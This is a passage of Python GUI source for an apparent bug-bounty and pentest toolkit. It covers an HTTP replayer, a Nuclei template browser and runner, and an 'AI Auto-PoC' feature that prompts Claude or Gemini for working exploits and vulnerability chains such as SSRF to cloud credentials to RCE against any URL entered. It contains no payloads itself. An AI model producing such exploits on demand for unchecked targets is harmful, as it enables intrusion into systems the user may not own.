        self._http_resp_txt.pack(fill='both', expand=True)
        self._http_headers_txt = mk_stext(headers_f, h=25, bg=BG3, fg=FG)
        self._http_headers_txt.pack(fill='both', expand=True)
        self._http_analysis_txt = mk_stext(analysis_f, h=25, bg=BG3, fg=YELLOW)
        self._http_analysis_txt.pack(fill='both', expand=True)
        self._http_diff_txt    = mk_stext(diff_f, h=25, bg=BG3, fg=FG)
        self._http_diff_txt.pack(fill='both', expand=True)

        bf2 = mk_frame(right, bg=BG2); bf2.pack(fill='x', padx=12, pady=(0,8))
        mk_btn(bf2, "📋 Copy Response", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._http_resp_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "💾 Save Response", lambda: self._save_text(self._http_resp_txt.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "🔄 Diff vs Last", self._http_diff, CYAN, small=True).pack(side='left', padx=4)

        self._http_history    = []
        self._http_last_resp  = None

    def _http_load_template(self, name, txt_widget):
        tmpl = http_replayer.REQUEST_TEMPLATES.get(name, "")
        if tmpl:
            txt_widget.delete('1.0','end')
            txt_widget.insert('end', tmpl.replace("{url}","https://example.com").replace("{host}","example.com").replace("{path}","/").replace("{len}","0").replace("{body}","{}"))

    def _http_send(self):
        raw = self._http_req_txt.get('1.0','end').strip()
        if not raw: return
        self._http_status_lbl.config(text="Sending...", fg=CYAN)
        proxy_str = self._http_proxy_var.get().strip()
        proxy_host = ""; proxy_port = 8080
        if proxy_str and ':' in proxy_str:
            parts = proxy_str.rsplit(':',1)
            proxy_host = parts[0]; proxy_port = int(parts[1])
        def _go():
            try:
                parsed = http_replayer.parse_raw_request(raw)
                resp   = http_replayer.send_request(parsed,
                    follow_redirects=self._http_follow_redir.get(),
                    proxy_host=proxy_host, proxy_port=proxy_port)
                analysis = http_replayer.analyze_response(resp)
                # Save to history
                self._http_history.append({"request": raw, "response": resp, "parsed": parsed})
                self._http_last_resp = resp
                def _update():
                    # Status bar
                    code = resp.get('status_code',0)
                    clr  = GREEN if 200 <= code < 300 else YELLOW if 300 <= code < 400 else RED
                    self._http_status_lbl.config(
                        text=f"HTTP {code} {resp.get('reason','')}  |  "
                             f"Size: {resp.get('size',0):,} bytes  |  "
                             f"Time: {resp.get('time_ms',0)}ms  |  "
                             f"URL: {resp.get('url','')[:60]}",
                        fg=clr)
                    # Raw response
                    self._http_resp_txt.config(state='normal'); self._http_resp_txt.delete('1.0','end')
                    self._http_resp_txt.insert('end', resp.get('body','')[:100000])
                    self._http_resp_txt.config(state='disabled')
                    # Headers
                    self._http_headers_txt.config(state='normal'); self._http_headers_txt.delete('1.0','end')
                    for k,v in resp.get('headers',{}).items():
                        self._http_headers_txt.insert('end', f"{k}: {v}\n")
                    self._http_headers_txt.config(state='disabled')
                    # Analysis
                    self._http_analysis_txt.config(state='normal'); self._http_analysis_txt.delete('1.0','end')
                    issues = analysis.get('issues',[])
                    if issues:
                        self._http_analysis_txt.insert('end', f"[!] {len(issues)} security issue(s) found:\n\n")
                        for iss in issues:
                            self._http_analysis_txt.insert('end', f"[{iss['severity']}] {iss['type']}\n  {iss['detail']}\n\n")
                    else:
                        self._http_analysis_txt.insert('end', "[OK] No obvious security issues detected\n")
                    summ = analysis.get('response_summary',{})
                    self._http_analysis_txt.insert('end', f"\nServer:  {summ.get('server','not disclosed')}\n")
                    self._http_analysis_txt.insert('end', f"Powered: {summ.get('x_powered','not disclosed')}\n")
                    self._http_analysis_txt.insert('end', f"CORS:    {summ.get('cors','none')}\n")
                    self._http_analysis_txt.insert('end', f"HSTS:    {summ.get('hsts','none')}\n")
                    self._http_analysis_txt.config(state='disabled')
                    self._http_history_btn_var.set(f"History: {len(self._http_history)}")
                    self.set_status(f"HTTP {code} • {resp.get('size',0)} bytes • {resp.get('time_ms',0)}ms", clr)
                self.root.after(0, _update)
            except Exception as e:
                self.root.after(0, lambda: (
                    self._http_status_lbl.config(text=f"Error: {e}", fg=RED),
                    self.set_status(f"Request error: {e}", RED)
                ))
        threading.Thread(target=_go, daemon=True).start()

    def _http_diff(self):
        if len(self._http_history) < 2:
            messagebox.showinfo("Need 2 responses", "Send at least 2 requests to compare.", parent=self.root); return
        r1 = self._http_history[-2]['response']
        r2 = self._http_history[-1]['response']
        diff = http_replayer.diff_responses(r1, r2)
        self._http_diff_txt.config(state='normal'); self._http_diff_txt.delete('1.0','end')
        self._http_diff_txt.insert('end', f"Size diff:   {diff['size_diff']:+d} bytes\n")
        self._http_diff_txt.insert('end', f"Time diff:   {diff['time_diff_ms']:+d}ms\n")
        self._http_diff_txt.insert('end', f"Status same: {not diff['status_diff']}\n")
        self._http_diff_txt.insert('end', f"Body changed:{diff['body_changed']}\n")
        self._http_diff_txt.insert('end', f"Added lines: {diff['added_lines']}\n")
        self._http_diff_txt.insert('end', f"Removed:     {diff['removed_lines']}\n\n")
        self._http_diff_txt.insert('end', diff.get('diff_text',''))
        self._http_diff_txt.config(state='disabled')

    # ════════════════════════════════════════════════════════════════
    #  TIER 1 — NUCLEI TEMPLATE MANAGER
    # ════════════════════════════════════════════════════════════════
    def _build_nuclei_mgr(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        bf = tk.Frame(nb2, bg=BG2); nb2.add(bf, text="  📋 Browse Templates  ")
        cf = tk.Frame(nb2, bg=BG2); nb2.add(cf, text="  ✏️ Create Template  ")
        pf = tk.Frame(nb2, bg=BG2); nb2.add(pf, text="  ⚡ Quick Presets  ")
        self._build_nuclei_browse(bf)
        self._build_nuclei_create(cf)
        self._build_nuclei_presets(pf)

    def _build_nuclei_browse(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(pad, "NUCLEI TEMPLATE BROWSER", "📋").pack(fill='x', pady=(0,8))
        sr = mk_frame(pad, bg=BG2); sr.pack(fill='x', pady=(0,8))
        tk.Label(sr, text="Search:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._nuclei_search = tk.StringVar()
        se = mk_entry(sr, var=self._nuclei_search, w=30); se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._nuclei_load_templates())
        tk.Label(sr, text="Category:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._nuclei_cat = tk.StringVar(value="all")
        cats = ["all"] + list(nuclei_mgr.TEMPLATE_CATEGORIES.keys())
        ttk.Combobox(sr, textvariable=self._nuclei_cat, values=cats, width=18, font=MONO_S).pack(side='left')
        mk_btn(sr, "🔍 Search", self._nuclei_load_templates, ACCENT, small=True).pack(side='left', padx=8)
        mk_btn(sr, "📥 Import URL", self._nuclei_import_url, CYAN, small=True).pack(side='left', padx=4)
        self._nuclei_count_lbl = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._nuclei_count_lbl.pack(anchor='w', pady=(0,4))
        cols = ("ID","Name","Severity","Tags","Source","File")
        self._nuclei_tree = mk_tree(pad, columns=cols, show='headings', height=18)
        wsz = {"ID":160,"Name":240,"Severity":80,"Tags":200,"Source":70,"File":200}
        for c in cols: self._nuclei_tree.heading(c,text=c); self._nuclei_tree.column(c, width=wsz.get(c,100))
        for sev in ('critical','high','medium','low','info'):
            fg = {'critical':RED,'high':YELLOW,'medium':CYAN,'low':GREEN,'info':FG2}.get(sev,FG2)
            self._nuclei_tree.tag_configure(sev, foreground=fg)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._nuclei_tree.yview)
        self._nuclei_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._nuclei_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        self._nuclei_tree.bind('<Double-1>', self._nuclei_view_template)
        bf2 = mk_frame(pad, bg=BG2); bf2.pack(fill='x', pady=(6,0))
        mk_btn(bf2, "▶ Run on Target", self._nuclei_run_selected, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "👁 View YAML", self._nuclei_view_template, FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf2, "📂 Open Folder", lambda: open_folder(str(nuclei_mgr.CUSTOM_DIR)), FG2, small=True).pack(side='left', padx=4)
        self._nuclei_load_templates()

    def _nuclei_load_templates(self):
        search = self._nuclei_search.get() if hasattr(self, '_nuclei_search') else ""
        cat    = self._nuclei_cat.get() if hasattr(self, '_nuclei_cat') else "all"
        if hasattr(self, '_nuclei_count_lbl'):
            self._nuclei_count_lbl.config(text="⏳ Loading templates...", fg=CYAN)
        def _go():
            templates = nuclei_mgr.list_templates(search=search, category=cat)
            # No templates? Offer to clone
            if not templates:
                tmpl_dir = nuclei_mgr.TMPL_DIR
                has_yaml = tmpl_dir.exists() and len(list(tmpl_dir.rglob("*.yaml"))) > 0
                if not has_yaml:
                    def _ask_clone():
                        if messagebox.askyesno("No Templates",
                            "nuclei-templates folder is empty or missing.\n\n"
                            "Auto-clone from GitHub? (~200MB)\n"
                            "git clone https://github.com/projectdiscovery/nuclei-templates",
                            parent=self.root):
                            self._nuclei_auto_clone()
                        else:
                            self._nuclei_count_lbl.config(
                                text="No templates — clone manually to nuclei-templates/", fg=RED)
                    self.root.after(0, _ask_clone)
                    return
            def _update():
                self._nuclei_tree.delete(*self._nuclei_tree.get_children())
                for t in templates:
                    sev = t.get('severity', 'info').lower()
                    self._nuclei_tree.insert('', "end",
                        values=(t.get('id',''), t.get('name',''), sev.upper(),
                                t.get('tags','')[:40], t.get('source',''), t.get('filename','')),
                        tags=(sev,))
                suffix = f" — '{search}'" if search else ""
                self._nuclei_count_lbl.config(
                    text=f"✅ {len(templates)} templates{suffix}",
                    fg=GREEN if templates else YELLOW)
            try:
                self.root.after(0, _update)
            except RuntimeError:
                pass
        threading.Thread(target=_go, daemon=True).start()

    def _nuclei_auto_clone(self):
        self._nuclei_count_lbl.config(text="⏳ Cloning nuclei-templates from GitHub...", fg=CYAN)
        tmpl_dir = nuclei_mgr.TMPL_DIR
        def _go():
            if shutil.which("git"):
                import subprocess as _sp
                result = _sp.run(
                    ["git", "clone", "--depth=1",
                     "https://github.com/projectdiscovery/nuclei-templates",
                     str(tmpl_dir)],
                    capture_output=True, text=True, timeout=600)
                if result.returncode == 0:
                    self.root.after(0, lambda: (
                        self.set_status(f"✅ Templates cloned to {tmpl_dir.name}/", GREEN),
                        self._nuclei_load_templates()
                    ))
                else:
                    err = result.stderr[:100]
                    self.root.after(0, lambda: (
                        self._nuclei_count_lbl.config(text=f"Clone error: {err}", fg=RED),
                        self.set_status(f"git clone failed: {err}", RED)
                    ))
            else:
                self.root.after(0, lambda: (
                    messagebox.showinfo("Install Git",
                        "git not found. Install git then run:\n\n"
                        "cd TeamCyberOps\n"
                        "git clone https://github.com/projectdiscovery/nuclei-templates",
                        parent=self.root),
                    webbrowser.open("https://git-scm.com/downloads")
                ))
        threading.Thread(target=_go, daemon=True).start()

    def _nuclei_view_template(self, _event=None):
        sel = self._nuclei_tree.selection()
        if not sel: return
        vals = self._nuclei_tree.item(sel[0])['values']
        path = None
        # Find path in template list
        tmpl_list = nuclei_mgr.list_templates(vals[0])
        for t in tmpl_list:
            if t.get('id','') == vals[0] or t.get('filename','') == vals[5]:
                path = t.get('path',''); break
        if path and os.path.isfile(path):
            content = open(path, errors='replace').read()
            self._show_text(f"Template: {vals[0]}", content)

    def _nuclei_run_selected(self):
        sel = self._nuclei_tree.selection()
        target = self.vuln_target.get() or self.project.get()
        if not target:
            messagebox.showwarning("No Target","Set target in Vuln Scanner tab.", parent=self.root); return
        if not target.startswith('http'): target = 'https://' + target
        if sel:
            vals  = self._nuclei_tree.item(sel[0])['values']
            # Find template path
            tmpl_list = nuclei_mgr.list_templates(vals[0])
            for t in tmpl_list:
                if t.get('id','') == vals[0]:
                    path = t.get('path','')
                    cmd  = ['nuclei','-u',target,'-t',path,'-silent','-no-color']
                    if hasattr(self, 'vuln_term') and self.vuln_term:
                        self.vuln_term.run_command(cmd, label=f"Nuclei: {vals[0]}")
                        self._goto_tab("Vuln Scanner")
                    return
        else:
            # Run all custom templates
            cmd = nuclei_mgr.build_nuclei_run_cmd(target, custom_dir=True)
            if hasattr(self, 'vuln_term') and self.vuln_term:
                self.vuln_term.run_command(cmd, label="Nuclei: All Custom Templates")
                self._goto_tab("Vuln Scanner")

    def _nuclei_import_url(self):
        url = simpledialog.askstring("Import Template", "GitHub raw URL or template URL:", parent=self.root)
        if not url: return
        def _go():
            r = nuclei_mgr.import_template_from_url(url)
            if "error" in r:
                self.root.after(0, lambda: messagebox.showerror("Error", r["error"], parent=self.root))
            else:
                self.root.after(0, lambda: (
                    self.set_status(f"Template imported: {r['meta'].get('id','unknown')}", GREEN),
                    self._nuclei_load_templates(),
                    messagebox.showinfo("Imported", f"Template saved to:\n{r['path']}", parent=self.root)
                ))
        threading.Thread(target=_go, daemon=True).start()

    def _build_nuclei_create(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(pad, "NUCLEI TEMPLATE BUILDER", "✏️").pack(fill='x', pady=(0,8))
        fields_f = mk_frame(pad, bg=BG2); fields_f.pack(fill='x', pady=(0,8))
        self._tmpl_vars = {}
        field_defs = [
            ("ID:",          "tmpl_id",  "my-custom-check",  30),
            ("Name:",        "tmpl_name","My Custom Check",  36),
            ("Severity:",    "tmpl_sev", "medium",           12),
            ("Method:",      "tmpl_meth","GET",              8),
            ("Path:",        "tmpl_path","/",                30),
            ("Tags:",        "tmpl_tags","custom",           30),
        ]
        for i, (lbl, key, default, w) in enumerate(field_defs):
            r, c = divmod(i, 2)
            fr = mk_frame(fields_f, bg=BG2); fr.grid(row=r, column=c, padx=8, pady=3, sticky='w')
            tk.Label(fr, text=lbl, bg=BG2, fg=FG2, font=MONO_S, width=10).pack(side='left')
            var = tk.StringVar(value=default); self._tmpl_vars[key] = var
            if key == "tmpl_sev":
                ttk.Combobox(fr, textvariable=var, values=["critical","high","medium","low","info"], width=w, font=MONO_S).pack(side='left')
            elif key == "tmpl_meth":
                ttk.Combobox(fr, textvariable=var, values=["GET","POST","PUT","DELETE","PATCH","HEAD"], width=w, font=MONO_S).pack(side='left')
            else:
                mk_entry(fr, var=var, w=w).pack(side='left', ipady=3)
        fields_f.columnconfigure(0, weight=1); fields_f.columnconfigure(1, weight=1)
        # Description
        tk.Label(pad, text="Description:", bg=BG2, fg=FG2, font=MONO_S).pack(anchor='w', pady=(4,2))
        self._tmpl_desc = mk_stext(pad, h=2, bg=BG3, fg=FG); self._tmpl_desc.pack(fill='x')
        # Matcher
        tk.Label(pad, text="Match Word/Regex in Response (one per line):", bg=BG2, fg=FG2, font=MONO_S).pack(anchor='w', pady=(6,2))
        self._tmpl_match = mk_stext(pad, h=3, bg=BG3, fg=FG); self._tmpl_match.pack(fill='x')
        self._tmpl_match.insert('end', "admin\ndashboard\nwelcome")
        # Headers
        tk.Label(pad, text="Custom Headers (Key: Value, one per line):", bg=BG2, fg=FG2, font=MONO_S).pack(anchor='w', pady=(6,2))
        self._tmpl_headers = mk_stext(pad, h=2, bg=BG3, fg=FG); self._tmpl_headers.pack(fill='x')
        # Preview + Save
        bf3 = mk_frame(pad, bg=BG2); bf3.pack(fill='x', pady=(8,0))
        mk_btn(bf3, "🔍 Preview YAML", self._nuclei_preview, CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf3, "💾 Save Template", self._nuclei_save_template, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf3, "▶ Save & Run", self._nuclei_save_and_run, ACCENT, small=True).pack(side='left', padx=4)
        tk.Label(pad, text="Preview:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(8,2))
        self._tmpl_preview = mk_stext(pad, h=10, bg=BG3, fg=GREEN); self._tmpl_preview.pack(fill='both', expand=True)

    def _get_template_from_form(self) -> str:
        v = self._tmpl_vars
        words = [w.strip() for w in self._tmpl_match.get('1.0','end').strip().split('\n') if w.strip()]
        matchers = [{"type": "word", "words": words, "part": "body", "condition": "or"},
                    {"type": "status", "status": [200]}] if words else [{"type": "status", "status": [200]}]
        # Parse headers
        headers = {}
        for line in self._tmpl_headers.get('1.0','end').strip().split('\n'):
            if ':' in line:
                k, val = line.split(':',1); headers[k.strip()] = val.strip()
        return nuclei_mgr.create_template(
            template_id  = v["tmpl_id"].get(),
            name         = v["tmpl_name"].get(),
            description  = self._tmpl_desc.get('1.0','end').strip(),
            severity     = v["tmpl_sev"].get(),
            target_url   = "{{BaseURL}}",
            method       = v["tmpl_meth"].get(),
            path         = v["tmpl_path"].get(),
            headers      = headers,
            matchers     = matchers,
            tags         = [t.strip() for t in v["tmpl_tags"].get().split(',') if t.strip()],
        )

    def _nuclei_preview(self):
        yaml = self._get_template_from_form()
        self._tmpl_preview.config(state='normal'); self._tmpl_preview.delete('1.0','end')
        self._tmpl_preview.insert('end', yaml); self._tmpl_preview.config(state='disabled')

    def _nuclei_save_template(self):
        yaml = self._get_template_from_form()
        tmpl_id = self._tmpl_vars["tmpl_id"].get()
        path    = nuclei_mgr.save_template(yaml, tmpl_id)
        self.set_status(f"Template saved: {path}", GREEN)
        messagebox.showinfo("Saved", f"Template saved to:\n{path}", parent=self.root)
        self._nuclei_load_templates()

    def _nuclei_save_and_run(self):
        self._nuclei_save_template()
        target = self.vuln_target.get() or self.project.get()
        if not target: return
        if not target.startswith('http'): target = 'https://' + target
        tmpl_id = self._tmpl_vars["tmpl_id"].get()
        path    = str(nuclei_mgr.CUSTOM_DIR / (tmpl_id + ".yaml"))
        cmd     = ['nuclei','-u',target,'-t',path,'-silent','-no-color']
        if hasattr(self, 'vuln_term') and self.vuln_term:
            self.vuln_term.run_command(cmd, label=f"Nuclei: {tmpl_id}")
            self._goto_tab("Vuln Scanner")

    def _build_nuclei_presets(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=12, pady=10)
        mk_section(pad, "QUICK-START TEMPLATE PRESETS", "⚡").pack(fill='x', pady=(0,10))
        tk.Label(pad, text="Click any preset to load, edit, and run immediately.",
                 bg=BG2, fg=FG2, font=MONO_S).pack(anchor='w', pady=(0,10))
        grid = mk_frame(pad, bg=BG2); grid.pack(fill='x', pady=(0,10))
        for i, (name, _) in enumerate(nuclei_mgr.PRESET_TEMPLATES.items()):
            r, c = divmod(i, 3)
            card = mk_card(grid); card.grid(row=r, column=c, padx=6, pady=6, sticky='nsew')
            grid.columnconfigure(c, weight=1)
            icon = name.split(')')[0]+')' if ')' in name else name[:3]
            tk.Label(card, text=name, bg=BG3, fg=FG, font=MONO_B, wraplength=160).pack(pady=(12,4), padx=8)
            preset_data = nuclei_mgr.PRESET_TEMPLATES[name]
            tk.Label(card, text=preset_data.get("description","")[:60], bg=BG3, fg=FG3,
                     font=(_MONO_FACE,8), wraplength=160).pack(pady=(0,4), padx=8)
            sev = preset_data.get("severity","medium")
            sev_clr = {'critical':RED,'high':YELLOW,'medium':CYAN,'low':GREEN}.get(sev,FG2)
            tk.Label(card, text=sev.upper(), bg=BG3, fg=sev_clr, font=MONO_S).pack(pady=(0,4))
            _n = name
            mk_btn(card, "▶ Load & Run", lambda n=_n: self._nuclei_run_preset(n), GREEN, small=True).pack(pady=(4,12))

        tk.Label(pad, text="", bg=BG2).pack(pady=4)
        tk.Label(pad, text="Preset YAML Preview:", bg=BG2, fg=FG2, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._preset_preview_txt = mk_stext(pad, h=12, bg=BG3, fg=GREEN)
        self._preset_preview_txt.pack(fill='both', expand=True)

    def _nuclei_run_preset(self, preset_name):
        yaml_content = nuclei_mgr.get_preset_yaml(preset_name)
        if not yaml_content:
            messagebox.showwarning("Error", f"Could not generate template for: {preset_name}", parent=self.root)
            return
        # Show preview
        if hasattr(self, '_preset_preview_txt') and self._preset_preview_txt:
            self._preset_preview_txt.config(state='normal')
            self._preset_preview_txt.delete('1.0','end')
            self._preset_preview_txt.insert('end', yaml_content)
            self._preset_preview_txt.config(state='disabled')
        # Save template
        preset  = nuclei_mgr.PRESET_TEMPLATES.get(preset_name, {})
        tmpl_id = preset.get("id","preset")
        path    = nuclei_mgr.save_template(yaml_content, tmpl_id)
        self.set_status(f"Template saved: {path}", GREEN)
        # Get target
        target = self.vuln_target.get().strip() or self.project.get().strip()
        if not target:
            messagebox.showinfo("Template Saved",
                f"Template saved to:\n{path}\n\nSet a target in Vuln Scanner tab to run it.",
                parent=self.root)
            return
        if not target.startswith('http'): target = 'https://' + target
        if not import_exists('nuclei'):
            messagebox.showinfo("Template Saved",
                f"Template saved to:\n{path}\n\nnuclei not installed. Run manually:\nnuclei -u {target} -t {path}",
                parent=self.root)
            return
        cmd = ['nuclei', '-u', target, '-t', path, '-silent', '-no-color']
        if hasattr(self, 'vuln_term') and self.vuln_term:
            self.vuln_term.run_command(cmd, label=f"Preset: {preset_name}")
            self._goto_tab("Vuln Scanner")
            self.set_status(f"Running preset: {preset_name}", GREEN)



    # ════════════════════════════════════════════════════════════════
    #  AI AUTO-EXPLOITATION METHODS
    # ════════════════════════════════════════════════════════════════
    def _build_ai_autopoc(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "AI AUTO-PoC GENERATOR", "💥").pack(fill='x', pady=(0,10))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text="  AI generates complete, working PoC for any vulnerability type\n"
                 "  Supports: XSS, SQLi, SSRF, IDOR, RCE, Auth Bypass, Custom",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        # Inputs
        f1 = mk_frame(pad, bg=BG2); f1.pack(fill='x', pady=(0,6))
        tk.Label(f1, text="Vuln Type:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._poc_type_var = tk.StringVar(value="XSS")
        ttk.Combobox(f1, textvariable=self._poc_type_var,
                     values=list(auto_exploit.AUTO_POC_PROMPTS.keys()), width=16, font=MONO_S).pack(side='left', padx=8)
        tk.Label(f1, text="URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._poc_url_ai = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "https://target.com/path")
        mk_entry(f1, var=self._poc_url_ai, w=38).pack(side='left', ipady=3)
        f2 = mk_frame(pad, bg=BG2); f2.pack(fill='x', pady=(0,6))
        tk.Label(f2, text="Parameter:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._poc_param_ai = tk.StringVar(value="q")
        mk_entry(f2, var=self._poc_param_ai, w=20).pack(side='left', padx=8, ipady=3)
        tk.Label(f2, text="Extra context:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._poc_extra_ai = tk.StringVar(value="")
        mk_entry(f2, var=self._poc_extra_ai, w=32).pack(side='left', ipady=3)
        # Provider
        f3 = mk_frame(pad, bg=BG2); f3.pack(fill='x', pady=(0,8))
        tk.Label(f3, text="AI Provider:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._poc_provider = tk.StringVar(value="claude")
        for prov, lbl, clr in [("claude","🤖 Claude",ACCENT),("gemini","✨ Gemini Flash",CYAN),("gemini-pro","⚡ Gemini Pro",GREEN)]:
            ttk.Radiobutton(f3, text=lbl, variable=self._poc_provider, value=prov).pack(side='left', padx=8)
        mk_btn(f3, "💥 Generate PoC", self._ai_gen_poc, RED).pack(side='right', padx=4, ipady=4)
        # Output
        self._poc_status_lbl = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._poc_status_lbl.pack(anchor='w', pady=(0,4))
        self._poc_output = mk_stext(pad, h=24, bg=BG3, fg=FG)
        self._poc_output.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy PoC", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._poc_output.get('1.0','end')),
            self.set_status("PoC copied!", GREEN)), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save as Report", lambda: self._save_text(self._poc_output.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🚩 Add to Findings", self._poc_add_to_findings, YELLOW, small=True).pack(side='left', padx=4)

    def _ai_gen_poc(self):
        vuln   = self._poc_type_var.get()
        url    = self._poc_url_ai.get().strip()
        param  = self._poc_param_ai.get().strip()
        extra  = self._poc_extra_ai.get().strip()
        prov   = self._poc_provider.get()
        if not url: messagebox.showwarning("No URL","Enter a target URL.", parent=self.root); return
        prompt = auto_exploit.build_auto_poc_prompt(vuln, url, param, {"context": extra})
        self._poc_status_lbl.config(text=f"Generating {vuln} PoC via {prov}...", fg=CYAN)
        self._poc_output.config(state='normal'); self._poc_output.delete('1.0','end')
        self._poc_output.config(state='disabled')
        cfg = load_cfg()
        api_key = cfg.get("api_keys",{}).get("gemini_api_key" if prov.startswith("gemini") else "anthropic_api_key","")
        def _go():
            from modules.ai.assistant import call_ai
            result = call_ai(prompt, max_tokens=4000, api_key=api_key, provider=prov)
            def _update():
                self._poc_output.config(state='normal')
                self._poc_output.delete('1.0','end')
                self._poc_output.insert('end', result)
                self._poc_output.config(state='disabled')
                self._poc_status_lbl.config(text=f"✓ PoC generated ({len(result)} chars)", fg=GREEN)
                self.set_status(f"PoC generated for {vuln}", GREEN)
            self.root.after(0, _update)
        threading.Thread(target=_go, daemon=True).start()

    def _poc_add_to_findings(self):
        content = self._poc_output.get('1.0','end').strip()
        if not content: return
        finding = {
            "title":   f"AI PoC: {self._poc_type_var.get()} at {self._poc_url_ai.get()}",
            "url":     self._poc_url_ai.get(),
            "type":    self._poc_type_var.get(),
            "severity":"HIGH",
            "description": content[:500],
            "poc":     content,
            "project": self.project.get(),
            "status":  "Open",
        }
        save_finding(finding)
        self.set_status("Finding saved!", GREEN)
        messagebox.showinfo("Saved","Added to Findings tab.", parent=self.root)

    def _build_ai_chains(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "VULNERABILITY CHAIN BUILDER", "🔗").pack(fill='x', pady=(0,10))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text="  Chain multiple vulnerabilities for maximum impact\n"
                 "  e.g. XSS → ATO, SSRF → AWS Creds → RCE, LFI → Log Poison → RCE",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Target URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._chain_url = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "https://target.com")
        mk_entry(tr, var=self._chain_url, w=44).pack(side='left', padx=8, ipady=3)
        # Chain selector
        chain_grid = mk_frame(pad, bg=BG2); chain_grid.pack(fill='x', pady=(0,10))
        for i, (name, data) in enumerate(auto_exploit.VULN_CHAINS.items()):
            r, c = divmod(i, 2)
            card = mk_card(chain_grid); card.grid(row=r, column=c, padx=6, pady=6, sticky='nsew')
            chain_grid.columnconfigure(c, weight=1)
            sev = data.get("impact","HIGH")
            sev_c = RED if sev=="CRITICAL" else YELLOW
            tk.Label(card, text=name, bg=BG3, fg=FG, font=MONO_B, wraplength=220).pack(pady=(10,4), padx=8)
            steps_str = "  →  ".join(data["steps"][:3]) + "..."
            tk.Label(card, text=steps_str, bg=BG3, fg=FG3, font=(_MONO_FACE,8), wraplength=220).pack(pady=(0,4), padx=8)
            tk.Label(card, text=f"Impact: {sev}", bg=BG3, fg=sev_c, font=MONO_S).pack(pady=(0,4))
            _n = name
            mk_btn(card, "🔗 Generate Chain PoC", lambda n=_n: self._ai_gen_chain(n), sev_c, small=True).pack(pady=(4,10))
        self._chain_output = mk_stext(pad, h=14, bg=BG3, fg=FG)
        self._chain_output.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(6,0))
        mk_btn(bf, "📋 Copy Chain", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._chain_output.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _ai_gen_chain(self, chain_name):
        url  = self._chain_url.get().strip()
        prov = self._poc_provider.get() if hasattr(self,'_poc_provider') else "claude"
        prompt = auto_exploit.build_chain_prompt(chain_name, url)
        self._chain_output.config(state='normal')
        self._chain_output.delete('1.0','end')
        self._chain_output.insert('end', f"[*] Generating chain: {chain_name}...\n")
        self._chain_output.config(state='disabled')
        cfg = load_cfg()
        api_key = cfg.get("api_keys",{}).get("gemini_api_key" if prov.startswith("gemini") else "anthropic_api_key","")
        def _go():
            from modules.ai.assistant import call_ai
            result = call_ai(prompt, max_tokens=4000, api_key=api_key, provider=prov)
            def _upd():
                self._chain_output.config(state='normal')
                self._chain_output.delete('1.0','end')
                self._chain_output.insert('end', result)
                self._chain_output.config(state='disabled')
                self.set_status(f"Chain PoC: {chain_name}", GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_ai_bounty(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "BOUNTY VALUE ESTIMATOR", "💰").pack(fill='x', pady=(0,10))
        # Inputs
        f1 = mk_frame(pad, bg=BG2); f1.pack(fill='x', pady=(0,6))
        tk.Label(f1, text="Vuln Type:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
